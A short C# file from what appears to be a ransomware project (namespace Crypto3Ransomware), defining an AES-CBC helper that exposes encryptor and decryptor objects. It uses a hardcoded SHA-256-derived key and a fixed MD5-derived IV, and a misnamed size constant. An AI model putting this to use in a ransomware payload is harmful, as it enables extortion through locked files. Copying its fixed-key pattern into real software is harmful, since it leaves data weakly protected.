using System.Security.Cryptography;

namespace Crypto3Ransomware;

public class MyAes
{
    private const int BlocSize = 128;
    public readonly Aes Aes;

    public MyAes()
    {
        Aes = Aes.Create();
        Aes.KeySize = BlocSize;
        Aes.Mode = CipherMode.CBC;
        Aes.Key = SHA256.HashData("TopSecretKey"u8.ToArray());
        Aes.IV = MD5.HashData("InitVector"u8.ToArray());
    }

    public ICryptoTransform GetEncryptor()
    {
        return Aes.CreateEncryptor();
    }

    public ICryptoTransform GetDecryptor()
    {
        return Aes.CreateDecryptor();
    }
}